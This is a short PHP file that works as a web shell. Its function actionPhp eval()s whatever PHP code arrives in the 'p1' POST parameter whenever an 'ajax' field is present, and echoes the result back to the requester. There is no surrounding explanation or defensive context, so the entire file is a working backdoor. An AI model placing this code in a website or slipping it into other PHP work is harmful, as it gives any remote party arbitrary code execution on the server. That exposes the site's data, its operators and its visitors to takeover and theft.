<?php
function actionPhp() {
	if(isset($_POST['ajax'])) {
		ob_start();
		eval($_POST['p1']);
		$temp = ob_get_clean();
		echo $temp;
	}
}

actionPhp();
?>